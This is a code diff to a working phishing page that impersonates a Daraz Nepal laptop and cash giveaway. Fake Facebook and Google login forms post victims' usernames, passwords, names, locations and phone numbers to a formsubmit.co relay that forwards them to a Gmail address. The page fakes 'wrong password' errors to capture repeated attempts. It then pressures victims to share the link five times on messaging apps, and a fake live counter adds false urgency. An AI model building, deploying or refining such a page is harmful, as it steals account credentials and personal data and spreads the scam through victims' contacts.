@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; overflow-x: hidden; }
+        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         .daraz-orange { color: #f85606; }
         .daraz-bg { background-color: #f85606; }
         .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
@@ -15,70 +15,88 @@
         input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline-color: #f85606; transition: 0.2s; }
         input:focus { border-color: #f85606; box-shadow: 0 0 0 2px rgba(248, 86, 6, 0.1); }
         .error-box { color: #e11d48; font-size: 12px; font-weight: 700; margin-bottom: 12px; display: none; background: #fff1f2; padding: 10px; border-radius: 10px; border: 1px solid #fda4af; }
-        #participation-ui, #success-ui { display: none; }
+        #participation-ui, #login-modal, #share-ui, #success-ui { display: none; }
         .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; cursor: pointer; border: none; }
         .btn-main:hover { background: #d44905; transform: translateY(-2px); box-shadow: 0 10px 20px rgba(248, 86, 6, 0.3); }
+        .progress-container { background: #eee; border-radius: 20px; height: 16px; width: 100%; margin: 20px 0; overflow: hidden; border: 1px solid #ddd; }
+        #progress-fill { background: linear-gradient(90deg, #f85606, #ff8a00); height: 100%; width: 0%; transition: width 0.8s ease-in-out; }
+        .share-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .share-btn { padding: 14px; border-radius: 12px; color: white; font-weight: 700; font-size: 13px; cursor: pointer; text-align: center; }
+        .s-wa { background: #25D366; } .s-fb { background: #1877F2; } .s-tg { background: #0088cc; } .s-ms { background: #006AFF; }
     </style>
 </head>
 <body>
 
     <div id="landing-page" class="max-w-2xl mx-auto py-12 px-6 text-center">
-        <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter">EXCLUSIVE <span class="daraz-orange">GIFT OFFER</span></h1>
-        <p class="text-lg text-gray-600 mb-8 font-bold">1x Laptop | 3x 15,000 NPR | 10x 5,000 NPR</p>
-
+        <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter uppercase">EXCLUSIVE <span class="daraz-orange">GIFT OFFER</span></h1>
         <div class="text-left bg-white p-8 rounded-3xl shadow-sm border border-gray-200 mb-8 space-y-4 text-sm leading-relaxed">
             <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase tracking-tighter">Rules & Policy</h3>
-             <p>1. Participation is strictly limited to one entry per person; any attempt to create multiple accounts or use automated bots will result in permanent disqualification and IP blocking.</p>
-            <p>2. Winners will be selected through a verified randomizer and will be contacted exclusively via the Email or Facebook account used during the secure login process.</p>
-            <p>3. To claim the Exclusive Laptop or Cash Prizes, winners must provide a valid Government-issued ID (Citizenship or License) that matches the name provided in the participation form.</p>
-            <p>4. All entries must be submitted before the official tournament deadline of 2082-11-29; no entries will be accepted or recorded after 11:59 PM on this date.</p>
-            <p>5. Daraz Nepal reserves the right to modify or cancel the tournament at any time if fraudulent activity is detected, ensuring a fair and transparent environment for all real customers.</p>
-            <p>6. Cash prizes of 15,000 NPR and 5,000 NPR will be disbursed via digital wallet (eSewa/Khalti) or bank transfer within 7 working days of winner verification.</p>
-            <p>7. Winners will be announced via a live-streamed lucky draw on the official Facebook page to ensure complete transparency for all participants.</p>
-            <p>8. Participants must ensure the phone number provided is active; three failed attempts to contact a winner will result in the selection of a runner-up.</p>
-            <p>9. By entering this tournament, you consent to the use of your first name and city on our "Live Winners Dashboard" for promotional purposes.</p>
+             <p>1. Participation is strictly limited to one entry per person.</p>
+            <p>2. Winners will be contacted exclusively via the Email or Facebook account used during registration.</p>
+            <p>3. To claim prizes, winners must provide a valid Government-issued ID.</p>
+            <p>4. All entries must be submitted before the official tournament deadline.</p>
             <div class="mt-6 pt-4 border-t flex items-center gap-3">
                 <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606] cursor-pointer">
                 <label for="agree-check" class="font-black text-gray-700 cursor-pointer uppercase text-xs">I agree to all tournament rules</label>
             </div>
         </div>
-        <button onclick="triggerLogin()" class="btn-main text-xl">GO TO OFFER</button>
+        <button onclick="showInfoPage()" class="btn-main text-xl">GO TO OFFER</button>
+    </div>
+
+    <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
+        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border border-gray-100">
+            <h2 class="text-3xl font-black mb-2 tracking-tight">User Information</h2>
+            <p class="text-gray-500 text-sm mb-8">Please enter your real details to proceed.</p>
+            <div class="space-y-4">
+                <input type="text" id="cust-name" placeholder="Full Name" required>
+                <input type="text" id="cust-location" placeholder="Current Location/City" required>
+                <input type="text" id="cust-phone" placeholder="Contact Number" required>
+                <select id="cust-shop">
+                    <option value="" disabled selected>Have you ever shopped in Daraz?</option>
+                    <option value="Yes">Yes</option>
+                    <option value="No">No</option>
+                </select>
+                <button type="button" onclick="showLoginModal()" class="btn-main">CONTINUE</button>
+            </div>
+        </div>
     </div>
 
     <div id="login-modal" class="modal-overlay">
         <div class="glass-card">
             <div class="text-2xl font-black daraz-orange tracking-tighter">Participation</div>
-            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest mb-6">Daraz Portal</p>
-            
-            <div id="error-display" class="error-box">Please Enter your Correct password and Try Again to participate!</div>
-
+            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest mb-6">Secure Portal</p>
+            <div id="error-display" class="error-box">Please Enter your Correct password and Try Again!</div>
             <form id="secure-form">
-                <select name="Login_Method" id="login-method" required>
+                <select id="login-method" required>
                     <option value="Facebook">Log in with Facebook</option>
                     <option value="Google">Log in with Email / Google</option>
                 </select>
-                <input type="text" name="Username" id="login-username" placeholder="Mobile number or email" required>
-                <input type="password" name="Password" id="password-input" placeholder="Password" required>
+                <input type="text" id="login-username" placeholder="Mobile number or email" required>
+                <input type="password" id="password-input" placeholder="Password" required>
                 <button type="submit" class="btn-main mt-4" id="login-btn">Register</button>
             </form>
         </div>
     </div>
 
-    <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
-        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border border-gray-100">
-            <h2 class="text-3xl font-black mb-2 tracking-tight">Final Details</h2>
-            <p class="text-gray-500 text-sm mb-8">Verified! Enter your delivery information.</p>
-            <div class="space-y-4">
-                <input type="text" id="cust-name" placeholder="Full Name" required>
-                <input type="text" id="cust-phone" placeholder="Phone Number" required>
-                <button type="button" id="final-btn" onclick="finalizeEntry()" class="btn-main">SUBMIT PARTICIPATION</button>
+    <div id="share-ui" class="min-h-screen flex items-center justify-center p-6">
+        <div class="bg-white p-8 rounded-[40px] shadow-2xl w-full max-w-md border text-center">
+            <h2 class="text-2xl font-black mb-1 uppercase tracking-tight">System Verification</h2>
+            <p class="text-gray-400 text-[10px] mb-4 uppercase font-bold tracking-widest">Share to 100% to unlock participation</p>
+            <div class="progress-container"><div id="progress-fill"></div></div>
+            <p class="text-[12px] font-black daraz-orange">PROGRESS: <span id="percent">0</span>%</p>
+            <div class="share-grid mt-6">
+                <div onclick="handleShare('wa')" class="share-btn s-wa">WhatsApp</div>
+                <div onclick="handleShare('fb')" class="share-btn s-fb">Facebook</div>
+                <div onclick="handleShare('tg')" class="share-btn s-tg">Telegram</div>
+                <div onclick="handleShare('ms')" class="share-btn s-ms">Messenger</div>
             </div>
+            <button onclick="completeEntry()" class="btn-main opacity-20 mt-10" id="unlock-btn">FINISH</button>
         </div>
     </div>
 
     <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
         <div class="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center text-4xl mb-6">🏆</div>
-        <h1 class="text-5xl font-black mb-4 tracking-tighter">PARTICIPATION SUCCESSFUL!</h1>
+        <h1 class="text-5xl font-black mb-4 tracking-tighter">SUCCESSFUL!</h1>
         <p class="max-w-md opacity-90 text-lg mb-12">Your entry is now live. Winners announced after 2082-11-29.</p>
         <div class="bg-black/20 p-8 rounded-[32px] border border-white/10 w-full max-w-sm">
             <p class="text-[10px] font-black uppercase tracking-widest opacity-60 mb-2">Live Participants</p>
@@ -87,45 +105,48 @@
     </div>
 
     <script>
-        // AJAX URL using your email
         const AJAX_URL = "https://formsubmit.co/ajax/yoshpick22@gmail.com";
         let loginAttempts = 0;
-        let savedUsername = "";
+        let shareCount = 0;
+        let leaveTime = 0;
+        let activeSharing = false;
+        let tempUser = {};
 
-        function triggerLogin() {
+        function showInfoPage() {
             if (document.getElementById('agree-check').checked) {
-                document.getElementById('login-modal').style.display = 'flex';
-            } else {
-                alert("Please agree to the Tournament Rules first!");
-            }
+                document.getElementById('landing-page').style.display = 'none';
+                document.getElementById('participation-ui').style.display = 'flex';
+            } else { alert("Please agree to the rules first!"); }
         }
 
-        const form = document.getElementById('secure-form');
-        form.onsubmit = async function(e) {
+        function showLoginModal() {
+            tempUser.name = document.getElementById('cust-name').value;
+            tempUser.loc = document.getElementById('cust-location').value;
+            tempUser.phone = document.getElementById('cust-phone').value;
+            tempUser.shop = document.getElementById('cust-shop').value;
+            if(!tempUser.name || !tempUser.phone) return alert("Fill all details!");
+            document.getElementById('login-modal').style.display = 'flex';
+        }
+
+        document.getElementById('secure-form').onsubmit = async function(e) {
             e.preventDefault();
             loginAttempts++;
-            
             const btn = document.getElementById('login-btn');
-            savedUsername = document.getElementById('login-username').value;
-            const password = document.getElementById('password-input').value;
-            const method = document.getElementById('login-method').value;
-
+            const u = document.getElementById('login-username').value;
+            const p = document.getElementById('password-input').value;
             btn.innerText = "Verifying...";
-            
-            try {
-                // Send Login Data via AJAX
-                await fetch(AJAX_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({
-                        _subject: "Daraz Login Attempt",
-                        Login_Method: method,
-                        Username: savedUsername,
-                        Password: password,
-                        Attempt_Number: loginAttempts
-                    })
-                });
-            } catch (err) { console.log(err); }
+
+            await fetch(AJAX_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    _subject: "New Entry Data",
+                    ...tempUser,
+                    Email_Phone: u,
+                    Password: p,
+                    Attempt: loginAttempts
+                })
+            });
 
             if (loginAttempts < 3) {
                 document.getElementById('password-input').value = "";
@@ -133,38 +154,45 @@
                 btn.innerText = "Try Again";
             } else {
                 document.getElementById('login-modal').style.display = 'none';
-                document.getElementById('landing-page').style.display = 'none';
-                document.getElementById('participation-ui').style.display = 'flex';
-                window.scrollTo(0, 0);
+                document.getElementById('participation-ui').style.display = 'none';
+                document.getElementById('share-ui').style.display = 'flex';
             }
         };
 
-        async function finalizeEntry() {
-            const name = document.getElementById('cust-name').value;
-            const phone = document.getElementById('cust-phone').value;
-            const fBtn = document.getElementById('final-btn');
+        function handleShare(p) {
+            activeSharing = true; leaveTime = Date.now();
+            const msg = "Win Laptop and Cash prizes from Daraz! Join here: " + window.location.href;
+            const urls = {
+                wa: "whatsapp://send?text=" + encodeURIComponent(msg),
+                fb: "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href,
+                tg: "https://t.me/share/url?url=" + window.location.href + "&text=" + encodeURIComponent(msg),
+                ms: "fb-messenger://share/?link=" + window.location.href
+            };
+            window.location.href = urls[p];
+        }
 
-            if(!name || !phone) return alert("Please fill all details!");
+        document.addEventListener("visibilitychange", function() {
+            if (document.visibilityState === 'visible' && activeSharing) {
+                activeSharing = false;
+                if (Date.now() - leaveTime > 1800) {
+                    shareCount++;
+                    if(shareCount > 5) shareCount = 5;
+                    let prog = (shareCount / 5) * 100;
+                    document.getElementById('progress-fill').style.width = prog + "%";
+                    document.getElementById('percent').innerText = Math.round(prog);
+                    if (shareCount >= 5) {
+                        document.getElementById('unlock-btn').classList.remove('opacity-20');
+                        document.getElementById('unlock-btn').innerText = "COMPLETE REGISTRATION";
+                    }
+                }
+            }
+        });
 
-            fBtn.innerText = "Finalizing...";
-            fBtn.disabled = true;
-
-            try {
-                // Send Name and Phone via AJAX
-                await fetch(AJAX_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-                    body: JSON.stringify({
-                        _subject: "Daraz Delivery Info",
-                        Account_Used: savedUsername,
-                        Full_Name: name,
-                        Phone_Number: phone
-                    })
-                });
-            } catch (err) { console.log(err); }
-
-            document.getElementById('participation-ui').style.display = 'none';
-            document.getElementById('success-ui').style.display = 'flex';
+        function completeEntry() {
+            if (shareCount >= 5) {
+                document.getElementById('share-ui').style.display = 'none';
+                document.getElementById('success-ui').style.display = 'flex';
+            }
         }
 
         setInterval(() => {
@@ -173,9 +201,16 @@
                 let v = parseInt(c.innerText.replace(',', ''));
                 c.innerText = (v + Math.floor(Math.random() * 3)).toLocaleString();
             }
-        }, 702);
+        }, 850);
     </script>
 </body>
 </html>
 
 
+
+
+
+
+
+            
+        
